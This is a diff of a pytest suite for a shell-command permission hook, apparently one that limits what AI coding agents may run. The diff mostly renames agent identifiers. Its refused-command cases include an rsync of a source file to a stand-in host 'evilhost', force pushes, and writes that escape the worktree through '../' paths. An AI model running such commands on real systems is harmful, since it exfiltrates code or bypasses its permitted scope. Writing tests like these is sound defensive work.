@@ -30,7 +30,7 @@ from tests.payloads import _b, _cwd
 
 pytestmark = pytest.mark.usefixtures("jail_fakes")
 HOOK = "shell_tripwires"
-WORKERS = ("repo-coder", "pr-train-conductor", "charter-docs")
+WORKERS = ("coder", "releaser", "charter-docs")
 
 
 @pytest.mark.parametrize(
@@ -63,7 +63,7 @@ def test_separator_matrix_blocks(agent: str | None, command: str) -> None:
 
 
 @pytest.mark.parametrize(
-    "agent", [a for a in BASH_AGENTS if a not in PIPE_ALLOWED and a != "repo-coder"]
+    "agent", [a for a in BASH_AGENTS if a not in PIPE_ALLOWED and a != "coder"]
 )
 def test_pipe_blocked_where_not_allowed(agent: str) -> None:
     # B1: no pipe flag; head with no path is outside the docs and conductor allowlists.
@@ -73,7 +73,7 @@ def test_pipe_blocked_where_not_allowed(agent: str) -> None:
 
 def test_coder_pipe_into_head_is_allowed() -> None:
     for command in ("git diff | head", "pytest -q | tail -n 5", "git log --oneline | wc -l"):
-        assert decide(_b("repo-coder", command), CFG).allow, command
+        assert decide(_b("coder", command), CFG).allow, command
     for agent in WORKERS:
         assert evaluate(HOOK, _b(agent, "git diff | head")) is None, agent
 
@@ -82,8 +82,8 @@ def test_or_chain_is_allowed_to_workers() -> None:
     # O3: || is judged segment by segment like && and |.
     for agent in WORKERS:
         assert evaluate(HOOK, _b(agent, "ls || true")) is None, agent
-    assert decide(_b("repo-coder", "git diff || git status"), CFG).allow
-    d = decide(_b("repo-coder", "ls || git push --force origin x"), CFG)
+    assert decide(_b("coder", "git diff || git status"), CFG).allow
+    d = decide(_b("coder", "ls || git push --force origin x"), CFG)
     assert not d.allow and d.reason == shell.R_FORCE_PUSH
 
 
@@ -134,11 +134,11 @@ def test_universal_tripwire_regressions(command: str) -> None:
 
 @pytest.mark.parametrize("command", ["$GIT push origin x", "git $SUB origin x"])
 def test_workers_blocked_on_variable_commands(command: str) -> None:
-    for agent in ("repo-coder", "pr-train-conductor", "charter-docs"):
+    for agent in ("coder", "releaser", "charter-docs"):
         assert not decide(_b(agent, command), CFG).allow, (agent, command)
 
 
-class TestRegressionRepoCoder:
+class TestRegressionCoder:
     @pytest.mark.parametrize(
         "command",
         [
@@ -158,7 +158,7 @@ class TestRegressionRepoCoder:
         ],
     )
     def test_blocked(self, command: str) -> None:
-        assert not decide(_b("repo-coder", command), CFG).allow, command
+        assert not decide(_b("coder", command), CFG).allow, command
 
 
 class TestRegressionCharterDocs:
@@ -177,7 +177,7 @@ class TestRegressionCharterDocs:
 
 class TestRegressionConductor:
     def test_default_branch_reason(self) -> None:
-        d = decide(_b("pr-train-conductor", "git push origin HEAD:main"), CFG)
+        d = decide(_b("releaser", "git push origin HEAD:main"), CFG)
         assert d.reason and "never push to the default branch (0001)" in d.reason
 
 
@@ -252,7 +252,7 @@ class TestRound3WorkerHygiene:
 
     def test_runner_forms_still_allowed(self) -> None:
         for command in ("python3 -m pytest -q", "node t.js", "uv run pytest"):
-            assert decide(_b("repo-coder", command), CFG).allow, command
+            assert decide(_b("coder", command), CFG).allow, command
 
 
 class TestQuotedHygiene:
@@ -267,8 +267,8 @@ class TestQuotedHygiene:
     )
     def test_dollar_inside_single_quotes_passes_hygiene(self, command: str) -> None:
         # O4: a single-quoted span is literal to the shell.
-        assert evaluate(HOOK, _b("repo-coder", command)) is None, command
-        assert decide(_b("repo-coder", command), CFG).allow, command
+        assert evaluate(HOOK, _b("coder", command)) is None, command
+        assert decide(_b("coder", command), CFG).allow, command
 
     @pytest.mark.parametrize(
         "command",
@@ -284,7 +284,7 @@ class TestQuotedHygiene:
     )
     def test_dollar_outside_quotes_is_refused(self, command: str) -> None:
         # O4: unquoted and double-quoted spans still expand.
-        assert evaluate(HOOK, _b("repo-coder", command)) == shell.R_HYGIENE, command
+        assert evaluate(HOOK, _b("coder", command)) == shell.R_HYGIENE, command
 
 
 class TestLiveRunGrammar:
@@ -293,7 +293,7 @@ class TestLiveRunGrammar:
         ["python3 -m mypy src tests", "python3 -m mypy src/hello.py", "python -m mypy src"],
     )
     def test_mypy_with_paths_allowed(self, command: str) -> None:
-        assert decide(_b("repo-coder", command), CFG).allow, command
+        assert decide(_b("coder", command), CFG).allow, command
 
     @pytest.mark.parametrize(
         "command",
@@ -307,7 +307,7 @@ class TestLiveRunGrammar:
     )
     def test_python3_dash_m_module_is_allowed(self, command: str) -> None:
         # B2 narrowed by audit finding (c) of Build Train 20261019-124612: the five runners only.
-        assert decide(_b("repo-coder", command), CFG).allow, command
+        assert decide(_b("coder", command), CFG).allow, command
 
     @pytest.mark.parametrize(
         "command",
@@ -322,7 +322,7 @@ class TestLiveRunGrammar:
     )
     def test_python3_dash_m_other_module_is_refused(self, command: str) -> None:
         # B2, finding (c): network_tools and unit_writes never see what another module does.
-        assert evaluate(HOOK, _b("repo-coder", command)) == shell.R_INLINE, command
+        assert evaluate(HOOK, _b("coder", command)) == shell.R_INLINE, command
 
     @pytest.mark.parametrize(
         "command",
@@ -330,12 +330,12 @@ class TestLiveRunGrammar:
     )
     def test_mypy_flags_blocked(self, command: str) -> None:
         # B2: flags after -m mypy pass; interpreter flags before -m and -c still refuse.
-        assert not decide(_b("repo-coder", command), CFG).allow, command
+        assert not decide(_b("coder", command), CFG).allow, command
 
     @pytest.mark.parametrize("command", ["python3 @args.txt", "python3 -m @args"])
     def test_mypy_argfile_blocked(self, command: str) -> None:
         # B2: an @file in the interpreter slot is neither a module name nor a worktree script.
-        assert not decide(_b("repo-coder", command), CFG).allow, command
+        assert not decide(_b("coder", command), CFG).allow, command
 
     @pytest.mark.parametrize(
         "command",
@@ -348,18 +348,18 @@ class TestLiveRunGrammar:
         ],
     )
     def test_python3_other_forms_refused(self, command: str) -> None:
-        assert not decide(_b("repo-coder", command), CFG).allow, command
+        assert not decide(_b("coder", command), CFG).allow, command
 
     def test_python3_path_inside_own_worktree_is_allowed(self, tmp_path: Path) -> None:
         # B2: a script that resolves under the coder's unit worktree.
-        assert decide(_b("repo-coder", f"python3 {WT}/scripts/x.py --flag"), CFG).allow
+        assert decide(_b("coder", f"python3 {WT}/scripts/x.py --flag"), CFG).allow
         repo, wt = _unit_repo(tmp_path / "repo")
         for command in (
             f"python3 {wt}/scripts/x.py",
             f"cd {wt} && python3 scripts/x.py",
             f"cd {wt}/scripts && python3 x.py | head",
         ):
-            assert decide(_cwd(_b("repo-coder", command), repo), CFG).allow, command
+            assert decide(_cwd(_b("coder", command), repo), CFG).allow, command
 
     def test_python3_path_outside_worktree_is_refused(self, tmp_path: Path) -> None:
         for command in (
@@ -369,8 +369,8 @@ class TestLiveRunGrammar:
             f"python3 {WT}/../x.py",
             f"python3 {CWD}/.claude/worktrees/u2/x.py",
         ):
-            assert evaluate(HOOK, _b("repo-coder", command)) == shell.R_INLINE, command
-        for agent in ("charter-docs", "pr-train-conductor"):
+            assert evaluate(HOOK, _b("coder", command)) == shell.R_INLINE, command
+        for agent in ("charter-docs", "releaser"):
             assert evaluate(HOOK, _b(agent, f"python3 {WT}/x.py")) == shell.R_INLINE, agent
         repo, wt = _unit_repo(tmp_path / "repo")
         for command in (
@@ -379,7 +379,7 @@ class TestLiveRunGrammar:
             f"cd {wt} && cd scripts && python3 x.py",
             f"cd {wt} || python3 x.py",
         ):
-            got = evaluate(HOOK, _cwd(_b("repo-coder", command), repo))
+            got = evaluate(HOOK, _cwd(_b("coder", command), repo))
             assert got == shell.R_INLINE, command
 
 
@@ -398,23 +398,23 @@ class TestDeclaredCommands:
         # B2: the manifest's command runs as one segment, exactly as declared.
         repo = self._repo(tmp_path)
         for command in ("bash scripts/test.sh", "env CI=1 ruff check ."):
-            assert decide(_cwd(_b("repo-coder", command), repo), CFG).allow, command
+            assert decide(_cwd(_b("coder", command), repo), CFG).allow, command
         for command in ("bash scripts/other.sh", "bash scripts/test.sh -x", "env CI=1 ruff"):
-            got = evaluate(HOOK, _cwd(_b("repo-coder", command), repo))
+            got = evaluate(HOOK, _cwd(_b("coder", command), repo))
             assert got == shell.R_INLINE, command
 
     def test_declared_typecheck_cmd_runs_verbatim(self, tmp_path: Path) -> None:
         repo = self._repo(tmp_path)
         command = "python3 -X dev -m mypy src"
-        assert decide(_cwd(_b("repo-coder", command), repo), CFG).allow
-        assert evaluate(HOOK, _cwd(_b("repo-coder", f"{command} tests"), repo)) == shell.R_INLINE
+        assert decide(_cwd(_b("coder", command), repo), CFG).allow
+        assert evaluate(HOOK, _cwd(_b("coder", f"{command} tests"), repo)) == shell.R_INLINE
         # B2: the exemption is the coder's; other agents keep their grammar.
         got = evaluate(HOOK, _cwd(_b("charter-docs", command), repo))
         assert got == shell.R_INLINE
 
     def test_undeclared_repo_has_no_verbatim_commands(self, tmp_path: Path) -> None:
         repo, _ = _unit_repo(tmp_path / "repo")
-        got = evaluate(HOOK, _cwd(_b("repo-coder", "bash scripts/test.sh"), repo))
+        got = evaluate(HOOK, _cwd(_b("coder", "bash scripts/test.sh"), repo))
         assert got == shell.R_INLINE
 
 
@@ -431,7 +431,7 @@ class TestNestedClaudeAndPathCommands:
         repo, wt = _unit_repo(tmp_path / "repo")
         (wt / "c").symlink_to(fake_claude)
         for command in (f"{wt}/c -p hi", f"cd {wt} && ./c -p hi"):
-            got = evaluate(HOOK, _cwd(_b("repo-coder", command), repo))
+            got = evaluate(HOOK, _cwd(_b("coder", command), repo))
             assert got == shell.R_CLAUDE_PATH, command
 
     @pytest.mark.parametrize(
@@ -439,7 +439,7 @@ class TestNestedClaudeAndPathCommands:
         ["/usr/bin/cat x", f"{WT}/scripts/run.sh", f"cd {WT} && ./scripts/run.sh", "ls x"],
     )
     def test_coder_path_command_in_a_trusted_place_is_allowed(self, command: str) -> None:
-        assert evaluate(HOOK, _b("repo-coder", command)) is None, command
+        assert evaluate(HOOK, _b("coder", command)) is None, command
 
     def test_declared_executables_run_by_absolute_path(self, tmp_path: Path) -> None:
         # issue 55: the manifest's own pytest and ruff, anchored at the project root, are trusted.
@@ -449,9 +449,9 @@ class TestNestedClaudeAndPathCommands:
             f"cd {wt} && {repo}/.venv/bin/pytest -q tests/test_a.py",
             f"cd {wt} && {repo}/.venv/bin/ruff check scripts",
         ):
-            assert evaluate(HOOK, _cwd(_b("repo-coder", command), repo)) is None, command
+            assert evaluate(HOOK, _cwd(_b("coder", command), repo)) is None, command
         for command in (f"{repo}/.venv/bin/pip install x", f"{repo}/.venv/bin/python -c 1"):
-            got = evaluate(HOOK, _cwd(_b("repo-coder", command), repo))
+            got = evaluate(HOOK, _cwd(_b("coder", command), repo))
             assert got == shell.R_UNTRUSTED_PATH, command
 
 
@@ -467,7 +467,7 @@ class TestNestedClaudeAndPathCommands:
 )
 def test_coder_path_command_elsewhere_is_refused(command: str) -> None:
     # issue 55: outside the bin folders, a unit worktree and the manifest's declared commands.
-    assert evaluate(HOOK, _b("repo-coder", command)) == shell.R_UNTRUSTED_PATH, command
+    assert evaluate(HOOK, _b("coder", command)) == shell.R_UNTRUSTED_PATH, command
 
 
 class TestCoderFrictionRows:
@@ -483,7 +483,7 @@ class TestCoderFrictionRows:
         ],
     )
     def test_confirmed_allowed(self, command: str) -> None:
-        assert decide(_b("repo-coder", command), CFG).allow, command
+        assert decide(_b("coder", command), CFG).allow, command
 
     @pytest.mark.parametrize(
         ("command", "want"),
@@ -493,11 +493,11 @@ class TestCoderFrictionRows:
         ],
     )
     def test_habits_stay_refused(self, command: str, want: str) -> None:
-        assert evaluate(HOOK, _b("repo-coder", command)) == want, command
+        assert evaluate(HOOK, _b("coder", command)) == want, command
 
 
 class TestProjectDataDir:
-    @pytest.mark.parametrize("agent", ["repo-coder", "pr-train-conductor"])
+    @pytest.mark.parametrize("agent", ["coder", "releaser"])
     @pytest.mark.parametrize(
         "command",
         [
@@ -519,7 +519,7 @@ class TestProjectDataDir:
         assert not d.allow and "never committed" in str(d.reason), (agent, command)
 
 
-@pytest.mark.parametrize("agent", ["repo-coder", "contract-spec", "charter-docs"])
+@pytest.mark.parametrize("agent", ["coder", "contract-spec", "charter-docs"])
 @pytest.mark.parametrize(
     "command",
     [
@@ -542,7 +542,7 @@ def test_worker_shell_variable_export_is_refused(agent: str, command: str) -> No
     assert not d.allow and want in str(d.reason), (agent, command)
 
 
-@pytest.mark.parametrize("agent", ["repo-coder", "contract-spec", "charter-docs"])
+@pytest.mark.parametrize("agent", ["coder", "contract-spec", "charter-docs"])
 @pytest.mark.parametrize(
     "command",
     [
@@ -568,7 +568,7 @@ def test_worker_shell_state_builtins_are_refused(agent: str, command: str) -> No
     assert not decide(_b(agent, command), CFG).allow, (agent, command)
 
 
-@pytest.mark.parametrize("agent", ["repo-coder", "contract-spec", "charter-docs"])
+@pytest.mark.parametrize("agent", ["coder", "contract-spec", "charter-docs"])
 @pytest.mark.parametrize(
     "command",
     [
@@ -584,14 +584,14 @@ def test_worker_trap_getopts_printf_v_refused(agent: str, command: str) -> None:
 
 
 def test_coder_plain_printf_allowed() -> None:
-    assert decide(_b("repo-coder", "printf 'x y'"), CFG).allow
+    assert decide(_b("coder", "printf 'x y'"), CFG).allow
 
 
 def test_coder_rsync_remote_refused_from_unit_worktree_cwd(tmp_path: Path) -> None:
     _, wt = _unit_repo(tmp_path / "repo")
     (wt / "src").mkdir()
     for command in (f"rsync {wt}/src/a.py evilhost:x", f"rsync -e touch {wt}/src/a.py evilhost:x"):
-        assert not decide(_cwd(_b("repo-coder", command), wt / "src"), CFG).allow, command
+        assert not decide(_cwd(_b("coder", command), wt / "src"), CFG).allow, command
 
 
 @pytest.mark.parametrize(
@@ -600,16 +600,16 @@ def test_coder_rsync_remote_refused_from_unit_worktree_cwd(tmp_path: Path) -> No
 )
 def test_stderr_dup_is_a_noop(command: str) -> None:
     # O3: fd duplication and discard change no file.
-    assert evaluate(HOOK, _b("repo-coder", command)) is None, command
-    assert decide(_b("repo-coder", command), CFG).allow, command
+    assert evaluate(HOOK, _b("coder", command)) is None, command
+    assert decide(_b("coder", command), CFG).allow, command
 
 
 @pytest.mark.parametrize(
     "command", ["git status >/dev/null", "ls &>/dev/null", "ls > /dev/null", "ls 1>/dev/null"]
 )
 def test_stdout_to_dev_null_is_a_noop(command: str) -> None:
-    assert evaluate(HOOK, _b("repo-coder", command)) is None, command
-    assert decide(_b("repo-coder", command), CFG).allow, command
+    assert evaluate(HOOK, _b("coder", command)) is None, command
+    assert decide(_b("coder", command), CFG).allow, command
 
 
 @pytest.mark.parametrize(
@@ -638,10 +638,10 @@ def test_unsupported_redirects_and_substitution_refused(command: str) -> None:
 
 
 def test_shell_tripwires_judges_the_hook_alone() -> None:
-    assert evaluate(HOOK, _b("repo-coder", "ls || true")) is None
-    assert evaluate(HOOK, _b("repo-coder", "git diff | head")) is None
-    assert evaluate(HOOK, _b("repo-coder", "CI=1")) == shell.R_ENV
-    assert evaluate(HOOK, _b("repo-coder", "CI=1 pytest -q")) is None
+    assert evaluate(HOOK, _b("coder", "ls || true")) is None
+    assert evaluate(HOOK, _b("coder", "git diff | head")) is None
+    assert evaluate(HOOK, _b("coder", "CI=1")) == shell.R_ENV
+    assert evaluate(HOOK, _b("coder", "CI=1 pytest -q")) is None
 
 
 def test_shell_tripwires_fixture_decisions() -> None:
@@ -678,8 +678,8 @@ DASH_GREP = f'grep -rnP "\\x{{2013}}|\\x{{2014}}" {WT}/scripts {WT}/tests'
     ],
 )
 def test_coder_dash_grep_with_its_exit_echo_is_allowed(command: str) -> None:
-    assert evaluate(HOOK, _b("repo-coder", command)) is None, command
-    assert decide(_b("repo-coder", command), CFG).allow, command
+    assert evaluate(HOOK, _b("coder", command)) is None, command
+    assert decide(_b("coder", command), CFG).allow, command
 
 
 def test_coder_dash_grep_write_forms_are_refused() -> None:
@@ -688,7 +688,7 @@ def test_coder_dash_grep_write_forms_are_refused() -> None:
         f'{DASH_GREP}; echo "exit=$?" > {WT}/../../../src/a.py',
         f"{DASH_GREP} | tee {WT}/../../../src/a.py",
     ):
-        assert not decide(_b("repo-coder", command), CFG).allow, command
+        assert not decide(_b("coder", command), CFG).allow, command
 
 
 @pytest.mark.parametrize(
@@ -696,11 +696,11 @@ def test_coder_dash_grep_write_forms_are_refused() -> None:
     ['echo "$HOME"', 'echo "${?}"', 'echo "$$?"', 'echo "\\$?"', "echo ~/x$?", "cat x$?"],
 )
 def test_exit_echo_admits_only_the_exit_status(command: str) -> None:
-    assert evaluate(HOOK, _b("repo-coder", command)) == shell.R_HYGIENE, command
+    assert evaluate(HOOK, _b("coder", command)) == shell.R_HYGIENE, command
 
 
 def test_exit_echo_is_the_coders_alone() -> None:
-    for agent in ("pr-train-conductor", "charter-docs", "security-auditor", "orchestrator"):
+    for agent in ("releaser", "charter-docs", "auditor", "orchestrator"):
         assert evaluate(HOOK, _b(agent, 'echo "exit=$?"')) == shell.R_HYGIENE, agent
 
 
